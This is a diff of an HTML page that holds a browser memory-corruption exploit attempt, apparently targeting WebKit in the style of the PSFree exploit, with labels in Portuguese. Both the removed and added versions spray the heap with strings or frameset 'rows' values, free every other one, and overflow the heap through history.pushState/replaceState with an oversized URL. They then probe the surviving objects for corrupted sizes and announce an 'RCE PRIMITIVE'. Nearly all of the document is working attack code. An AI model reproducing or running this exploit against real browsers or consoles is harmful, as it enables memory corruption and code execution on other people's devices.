@@ -1,145 +1,113 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>PSFree Final: Error Trigger</title>
+    <title>Frameset Lag Detector</title>
     <style>
         body { background-color: #000; color: #00ff00; font-family: monospace; padding: 20px; }
-        button { font-size: 24px; padding: 20px; width: 100%; border: 2px solid #00ff00; background: #111; color: #fff; cursor: pointer; }
-        #log { margin-top: 20px; border: 1px solid #333; height: 400px; overflow-y: scroll; padding: 10px; color: cyan; font-size: 14px;}
-        .win { background-color: #00ff00; color: #000; font-weight: bold; font-size: 1.5em; padding: 10px; border: 2px solid white; }
+        button { 
+            font-size: 24px; padding: 20px; width: 100%; border: 2px solid #00ff00; background: #111; color: #fff; cursor: pointer;
+        }
+        #log { border: 1px solid #333; height: 400px; overflow-y: scroll; padding: 10px; color: cyan; }
     </style>
 </head>
 <body>
 
-    <h1>Técnica Final: Error Object Trigger</h1>
-    <p>Usando 'new Error(str).message' para forçar a leitura do Heap corrompido.</p>
+    <h1>Frameset Detector (Memory Spike)</h1>
+    <p>A prova de corrupção será um erro de 'Out Of Memory' ao ler um único objeto.</p>
 
-    <button onclick="startErrorAttack()">INICIAR ATAQUE CORRIGIDO</button>
+    <button onclick="startLagAttack()">INICIAR DETECTOR</button>
     
     <div id="log">Pronto. Reinicie o console.</div>
 
     <script>
-        const BASE_OFFSET = 709522;
+        const BASE_OFFSET = 709520;
         const OVERFLOW_AMT = 1024 * 64; 
 
-        // Tamanho padrão PSFree
-        const TARGET_SIZE = 80; 
-        const HEADER_SIZE = 24;
-        const DATA_SIZE = TARGET_SIZE - HEADER_SIZE;
+        // Configuração para 4MB (Alinhamento Large Heap)
+        const TARGET_SIZE_MB = 4;
+        const TARGET_ELEMENTS = (TARGET_SIZE_MB * 1024 * 1024) / 8;
+        const ROWS_STRING = ",".repeat(TARGET_ELEMENTS - 2);
 
+        const SPRAY_COUNT = 60; // Quantidade moderada
         var victims = [];
 
         function log(msg, type) {
             const el = document.getElementById('log');
-            let cls = type === 'win' ? 'class="win"' : '';
-            el.innerHTML += `<div ${cls}>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
+            let color = type === 'win' ? '#0f0' : 'cyan';
+            el.innerHTML += `<div style="color:${color}">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
             el.scrollTop = el.scrollHeight;
         }
 
-        function sleep(ms=0) {
-            return new Promise(resolve => setTimeout(resolve, ms));
-        }
+        async function startLagAttack() {
+            log(`1. Alocando ${SPRAY_COUNT} Framesets de 4MB...`);
 
-        function gc() {
-            try { new Uint8Array(4 * 1024 * 1024); } catch(e){}
-        }
+            // 1. SPRAY
+            for(let i=0; i<SPRAY_COUNT; i++) {
+                let fset = document.createElement('frameset');
+                fset.rows = ROWS_STRING;
+                victims.push(fset);
+            }
 
-        async function startErrorAttack() {
-            log("Iniciando Loop com Trigger de Erro...");
-            
-            // Construção fiel ao PSFree: Pad + Index
-            // Garante que é uma string 'Flat' de 8 bits
-            const pad = "B".repeat(DATA_SIZE);
+            // 2. BURACOS (PSFree Strategy)
+            log("2. Abrindo buracos...");
+            for(let i=0; i<SPRAY_COUNT; i+=2) {
+                victims[i].rows = ""; 
+                victims[i] = null;
+            }
 
-            let attempt = 0;
-            const MAX_ATTEMPTS = 500; 
+            await forceGC();
 
-            while(attempt < MAX_ATTEMPTS) {
-                attempt++;
-                if(attempt % 10 === 0) log(`--- Tentativa ${attempt} ---`);
-
-                // 1. SPRAY
-                victims = [];
-                for(let i=0; i<4000; i++) {
-                    // Técnica de join para evitar Rope Strings temporárias
-                    let s = [pad, i].join("").substring(0, DATA_SIZE);
-                    victims.push(s);
-                }
-
-                // 2. BURACOS
-                for(let i=0; i<victims.length; i+=2) {
-                    victims[i] = null;
-                }
-                
-                gc();
-                await sleep(20); 
-
-                // 3. EXPLOIT
+            // 3. EXPLOIT
+            log("3. Disparando Overflow (Corrompendo '_size')...");
+            setTimeout(() => {
                 try {
                     let buffer = "A".repeat(BASE_OFFSET);
                     buffer += "\x01".repeat(OVERFLOW_AMT);
                     
-                    history.replaceState({}, "pwn", "/" + buffer);
-                    
-                    // 4. CHECAGEM COM O TRUQUE DO ERROR
-                    if (checkWithErrorTrigger(DATA_SIZE)) {
-                        return; 
-                    }
+                    history.pushState({}, "pwn", "/" + buffer);
 
-                } catch(e) {
-                    // Ignora erros de memória transitórios
-                    victims = null;
-                    await forceGC();
+                    log("4. Sondando vítimas (Procurando OOM)...");
+                    probeVictims();
+
+                } catch (e) {
+                    log("Erro no Exploit: " + e.message);
                 }
-
-                victims = null;
-                if(attempt % 20 === 0) await forceGC();
-                await sleep(20);
-            }
-            
-            log("Falha após " + MAX_ATTEMPTS + " tentativas.");
+            }, 500);
         }
 
-        function checkWithErrorTrigger(originalLen) {
+        function probeVictims() {
+            // Varre os sobreviventes
             for(let i=1; i<victims.length; i+=2) {
-                let s = victims[i];
-                if(!s) continue;
+                let fset = victims[i];
+                if(!fset) continue;
 
-                // --- O TRUQUE DO PSFREE ---
-                // Não checamos s.length.
-                // Criamos um Error para forçar o WebKit a reler o StringImpl do Heap.
-                
                 try {
-                    let err = new Error(s);
-                    let leakedStr = err.message;
+                    // Tenta ler .rows
+                    // Se o objeto estiver normal, isso é rápido e retorna uma string de 4MB.
+                    // Se estiver CORROMPIDO (size = 0x01... = Petabytes), o WebKit vai tentar
+                    // alocar Petabytes de string e falhar com erro.
                     
-                    // Se o tamanho da mensagem do erro for diferente da string original...
-                    if (leakedStr.length !== originalLen) {
-                        log(`!!! SUCESSO !!! String ${i} corrompida!`, 'win');
-                        log(`Original: ${originalLen} | Novo (via Error): ${leakedStr.length}`, 'win');
-                        alert("RCE PRIMITIVE: ERROR OBJECT TRIGGER!");
-                        return true;
-                    }
+                    let temp = fset.rows;
                     
-                    // Checagem de conteúdo (byte 0x01)
-                    if (leakedStr.charCodeAt(0) !== 66) { 
-                         log(`!!! SUCESSO !!! Conteúdo alterado no index ${i}`, 'win');
-                         return true;
-                    }
+                    // Se chegou aqui, leu normal (não foi corrompido)
+                    // (Opcional: checar length se não for custoso)
+                    
                 } catch(e) {
-                    // Se der erro ao criar o Error, pode ser que o Heap esteja tão corrompido
-                    // que travou a leitura. Isso também é um sinal positivo.
-                    log(`Crash ao ler string ${i}: ${e.message}`);
+                    // SE DER ERRO AQUI, É SUCESSO!
+                    // O erro será algo como "Out of memory" ou "String too long"
+                    log(`!!! SUCESSO !!! Vítima ${i} gerou erro ao ler!`, 'win');
+                    log(`Erro capturado: ${e.message}`, 'win');
+                    alert("RCE PRIMITIVE: FRAMESET SIZE CORRUPTED!");
+                    return;
                 }
             }
-            return false;
+            log("Nenhuma anomalia detectada.");
         }
 
         async function forceGC() {
-            try { new ArrayBuffer(20 * 1024 * 1024); } catch(e){}
-            return new Promise(r => setTimeout(r, 500));
+            try { new ArrayBuffer(50 * 1024 * 1024); } catch(e){}
+            return new Promise(r => setTimeout(r, 800));
         }
     </script>
 </body>
 </html>
-
